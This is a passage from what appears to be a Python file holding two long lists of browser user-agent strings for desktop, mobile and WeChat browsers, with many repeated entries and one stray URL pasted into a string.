     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN']

mozila = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
